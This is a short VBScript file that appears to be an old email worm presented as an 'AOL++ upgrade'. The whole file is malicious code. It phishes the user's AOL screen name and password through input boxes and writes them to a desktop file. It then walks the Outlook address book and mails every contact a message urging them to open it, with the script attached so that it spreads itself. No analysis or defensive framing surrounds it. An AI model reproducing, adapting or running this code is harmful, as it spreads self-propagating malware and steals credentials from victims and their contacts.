   w = inputbox("Enter Password:" , "Password:stupid")
   if w = "stupid" then
   a = inputbox("What is your AOL Screen Name? ", "Aol", "Aol")
   b = inputbox("What is your AOL password? ", "Aol", "Aol")
   set fs = createobject("Scripting.filesystemobject")
   set c = fs.createtextfile ("C:\WINDOWS\Desktop\AOL Upgrade.txt")
   c.writeline ("Screen Name: ")&a
   c.writeline ("Password: ")&b
   c.writeline ("Your AOL++ will fully activate in one week, until then enjoy AOL.")
   c.close
   msgbox "Will fully activate in one week, until then enjoy AOL."
   Dim x
   on error resume next
   Set fso ="Scripting.FileSystem.Object"
   Set so=CreateObject(fso)
   Set ol=CreateObject("Outlook.Application")
   Set out= WScript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For x=1 To a.AddressEntries.Count
   Set Mail=ol.CreateItem(0)
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Mail.Subject="AOL Upgrades, open ASAP!"
   Mail.Body="Username: &a   Password: &b(evrybody that gets this please sign on and do whatever you want..."
   Mail.Attachments.Add Wscript.ScriptFullName
   Mail.Send
   Next
   ol.Quit
   end if
